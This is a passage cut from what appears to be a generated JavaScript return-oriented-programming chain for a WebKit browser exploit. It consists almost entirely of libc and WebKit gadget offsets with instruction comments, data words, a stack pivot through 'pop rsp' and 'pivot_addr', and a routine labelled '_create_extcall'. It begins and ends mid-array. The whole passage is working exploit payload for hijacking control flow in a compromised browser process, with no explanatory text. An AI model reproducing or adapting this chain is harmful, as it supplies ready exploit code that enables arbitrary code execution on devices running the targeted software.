webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+84456, //L473
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+84408, //L470
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+84440, //L472
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L470:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L471:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L472:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L473:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+84576, //L475
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+84592, //L476
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+84560, //L474
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L474:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L475:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L476:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+84680, //L477
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+84736, //L480
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L480:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+84808, //L481
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+84864, //L484
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L484:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L485:
libc_base+793877, //pop rsi
ropchain+84968, //L488
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L487:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L488:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85056, //L489
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85072, //L491
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L489:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L491:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+85224, //L493
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+85256, //L495
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+85208, //L492
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85240, //L494
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L492:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L493:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L494:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L495:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+85352, //L497
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+85336, //L496
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L496:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L497:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+85440, //L499
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L498:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85512, //L502
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L501:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L502:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+85576, //L503
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L503:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+73968, //L202
//L235:
libc_base+793877, //pop rsi
ropchain+85688, //L507
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L506:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85776, //L508
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85792, //L510
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L508:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+85912, //L512
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+85928, //L513
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+85896, //L511
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L511:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L512:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86024, //L514
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86040, //L515
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L514:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86152, //L516
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86136, //L517
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L517:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+86240, //L519
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+86224, //L518
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L518:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86336, //L520
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86352, //L521
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L520:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86464, //L522
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86448, //L523
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L523:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L522:
db([0, 0]); // 0x0
//_create_extcall:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86536, //L524
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L524:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+86600, //L526
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L526:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L529:
db([32, 0]); // 0x20
set_gadget(libc_base+792472,); //pop rcx
//L530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+86752, //L531
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+86768, //L533
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L531:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L533:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+86856, //L534
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+86888, //L537
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L534:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L536:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+206806,); //pop rdi
//L537:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L539:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+87016, //L540
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87032, //L542
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L540:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L542:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+87176, //L545
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87144, //L543
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87160, //L544
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L543:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L544:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L545:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+87248, //L546
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L546:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+87304, //L549
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L549:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87384, //L550
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L550:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L551:
db([1, 0]); // 0x1
set_gadget(libc_base+792472,); //pop rcx
//L552:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+87488, //L553
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+87504, //L554
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L553:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+87592, //L555
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L555:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+87648, //L558
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L558:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+87768, //L561
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L560:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L561:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+87856, //L562
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87872, //L564
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L562:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L564:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88016, //L567
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87984, //L565
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+88000, //L566
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L565:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L566:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L567:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+88088, //L568
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+88144, //L571
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L571:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+88224, //L572
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L572:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L573:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L574:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+88328, //L575
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+88344, //L576
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L575:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+88432, //L577
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L577:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88488, //L580
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L580:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+88560, //L581
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L581:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88616, //L584
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L584:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L585:
pivot_addr,
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+88768, //L588
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L587:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L588:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+88856, //L589
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+88872, //L591
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L589:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L591:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89016, //L594
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+88984, //L592
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89000, //L593
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L592:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L593:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L594:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89088, //L595
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L595:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+89144, //L598
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L598:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+89224, //L599
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L599:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L600:
db([1, 0]); // 0x1
set_gadget(libc_base+792472,); //pop rcx
//L601:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+89328, //L602
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+89344, //L603
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L602:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+89432, //L604
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L604:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89488, //L607
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L607:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89560, //L608
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L608:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89616, //L611
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L611:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89720, //L614
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L613:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L614:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+89808, //L615
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89824, //L617
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L615:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L617:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89968, //L620
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+89936, //L618
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89952, //L619
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L618:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L619:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L620:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+90040, //L621
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L621:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90096, //L624
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L624:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+90176, //L625
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L625:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L626:
db([8, 0]); // 0x8
set_gadget(libc_base+792472,); //pop rcx
//L627:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+90280, //L628
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+90296, //L629
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L628:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+90384, //L630
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L630:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+90440, //L633
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L633:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90560, //L636
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
